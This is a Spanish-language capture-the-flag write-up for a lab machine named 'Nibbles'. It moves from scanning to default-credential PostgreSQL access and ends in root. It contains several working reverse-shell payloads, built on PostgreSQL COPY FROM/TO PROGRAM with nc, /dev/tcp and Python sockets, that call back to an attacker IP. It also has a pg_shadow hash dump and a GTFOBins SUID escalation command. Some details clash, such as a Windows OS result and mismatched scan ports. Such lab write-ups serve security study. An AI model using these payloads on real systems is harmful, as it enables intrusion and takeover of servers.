---
tags:
  - http
  - SUID
  - postgres
  - fuzzing-web
  - gtfobins
SO: Linux 5.0
---

## Información General
- **Nombre de la máquina**: Nibbles
- **Dirección IP**: 192.168.179.47
- **Sistema Operativo**: Linux 5.0
- **Nivel de dificultad**: Medium
- **Fecha de resolución**: 25/08/2025
- **Autor**: : Gonzalo Zumaquero Andujar

---

## 1 Reconocimiento Inicial

#### Escaneo de SO

``` bash
nmap -O $IP -oN SO     
```
**Sistema**  Microsoft Windows Server 2008
###  Escaneo de puertos - Nmap 
```bash
nmap -p- --open -sS -Pn -n --min-rate 5000 -vvv $IP -oA allPorts  
```
**Open ports:**  21,22,5437,80

### Escaneo de servicios en puertos abiertos - Nmap 
```bash
nmap -sCV -p21,242,3145,3389 $IP -oA services
```
*Servicios detectados:* 

| PORT | SERVICE | VERSION |
|----:|---------|---------|
| 21 | ftp | vsftpd 3.0.3 |
| 22 | ssh | OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0) |
| 80 | http | Apache httpd 2.4.38 ((Debian)) |
| 5437 | postgresql | PostgreSQL DB 11.3 - 11.9 |

---

## 2 ENUMERACION INICIAL 

#### PUERTO 21 SERVICIO FTP*

Se prueba conexión anónima

``` bash
ftp  "ftp://anonymous:anonymous@$IP" 
ftp  "ftp://admin:admin@$IP"  
```
*SIN CONCLUSIONES*

- Posibles vulnerabilidades: Fuerza bruta pero se necesita un usuario para que se más efectivo
#### PUERTO 80 SERVICIO HTTP

Exploración inicial
``` bash
whatweb 192.168.179.47     
```
- Servicios encontrados:
	- Apache[2.4.38]
	- [Debian Linux]Apache/2.4.38 (Debian)

Fuzzing inicial
``` bash
nmap --script http-enum -p 80 $IP  
```
**Sin resultados**

Fuzzing básico:
``` bash
gobuster dir -u http://192.168.179.47/ \                            
  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
  -x php,html,txt,bak,zip,conf,log,old,js \                         
  -t 50 \                                                           
  -o gobuster_basic.txt \                                           
  -b 403,404 
```

*CONCLUSIONES* 
- Posibles vulnerabilidades: no encontradas, directory listing con fuzzing sin resultados

#### PUERTO  5437 SERVICIO POSTGRES

Se prueba a logearse con credenciales dadas por defecto en postgres:
`postgres@postgres`

``` bash
psql -h 192.168.179.47 -p 5437 -U postgres -W
```
**Conclusiones**
- Se ha obtenido acceso a la sesión
- Se deberá revisar los permios con el usuario actual, es posible que se puedan escribir ficheros o realizar una lectura de los ya existentes

Se comprueban permisos:
``` sql
\du+ 
```

![[Nibbles_postgres_permisos.png]](../images/Nibbles_postgres_permisos.png)

Se comprueba que el usuario actual tiene permisos de creación de roles, bases de datos, replicación e ignorar RLS

Se realiza una revisión de directorios:

![[Nibbles_postgres_lista.png]](../images/Nibbles_postgres_lista.png)

Detectado usuario wilson

Se realiza una búsqueda de usuario y contraseñas:
``` sql
SELECT usename, passwd from pg_shadow; 
```
![[Nibbles_postgres_usr_pwd.png]](../images/Nibbles_postgres_usr_pwd.png)

Detectado usuario postgres con hash en md5 sin resultados con el rockyou.txt

**NO SE HAN ENCONTRADO FALLOS DE CONFIGURACIÓN ->**
**SE REALIZA UNA BÚSQUEDA DE VULNERABILIDADES**

Se comprueba versión para buscar vulnerabilidades conocidas:
``` sql
postgres=# SELECT version();
```
![[Nibbles_postgres_version.png]](../images/Nibbles_postgres_version.png)

Se realiza una búsqueda de vulnerabilidades conocidas para la versión detectada con resultados positivos.

## 3 Explotación

``` sql
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(line text);

-- Usa $$...$$ para no pelearte con comillas
COPY cmd_exec FROM PROGRAM $$
bash -c 'rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f|/bin/sh -i 2>&1 \
| nc 192.168.49.56 80 >/tmp/f'
$$;
```

Se ha obtenido una revershell:

![[Nibble_revershell.png]](../images/Nibble_revershell.png)

Otras formas habrían sido: 

**SIN CREAR TABLA**
``` sql
-- No necesitas tabla en esta variante
COPY (SELECT '') TO PROGRAM $$
bash -c 'nohup bash -c "rm -f /tmp/f; mkfifo /tmp/f; \
cat /tmp/f|/bin/sh -i 2>&1 | nc 192.168.49.56 80 >/tmp/f" \
>/dev/null 2>&1 &'
$$;
```

**CON BASH**
``` SQL
COPY (SELECT '') TO PROGRAM $$
bash -c 'nohup bash -i >& /dev/tcp/192.168.49.56/80 0>&1 >/dev/null 2>&1 &'
$$
```

**CON PYTHON**
``` SQL
COPY (SELECT '') TO PROGRAM $$
python3 -c 'import os,pty,socket; s=socket.socket(); s.connect(("192.168.49.56",80));
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]; pty.spawn("/bin/sh")' &
$$;
```

**Evidencia**:

![[Nibble_local_flag.png]](../images/Nibble_local_flag.png)

---

## Escalada de privilegios

Se realiza una búsqueda de malas configuraciones SUID:

``` bash
find / -perm -4000 -type f -uid 0 -exec ls -la {} \; 2>/dev/null | sort
```
Se muestran los resultados:

![[Nibbles_escalada_SUID.png]](../images/Nibbles_escalada_SUID.png)

Encontrados ejecutables que podrían permitir una escalada, se prueba con find, búsqueda en GFTObins:

![[Nibbles_suid_gtobins.png]](../images/Nibbles_suid_gtobins.png)

``` bash
/usr/bin/find  . -exec /bin/sh -p \; -quit 
```

**OBTENIDOS PERMISOS DE ROOT**

![[Nibbles_rootflag.png]](../images/Nibbles_rootflag.png)


---

## Lecciones aprendidas
- Técnicas nuevas descubiertas:
	- Cómo logearse y buscar malas configuraciones en postgrescli
		- psql
	- Búsqueda de vinarios con permisos mal otorgados

- Errores cometidos y cómo evitarlos en el futuro:
	- Mal procedimiento, una vez detectados los servicios es mejor profundizar en la versión de estos y buscar vulnerabilidades conocidas en vez de intentar encontrar una mala configuración, es más rápido descartar que no existan vulnerabilidades y si existen es más rápido aplicarlas.

---

## Recursos y referencias
- [Exploit-DB](https://www.exploit-db.com/)
- [GTFOBins](https://gtfobins.github.io/)
- [HackTricks](https://book.hacktricks.xyz/)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
- [VeryLazyTech](https://www.verylazytech.com/)
- [HackinArticles]([Penetration Testing](https://www.hackingarticles.in/penetration-testing/))
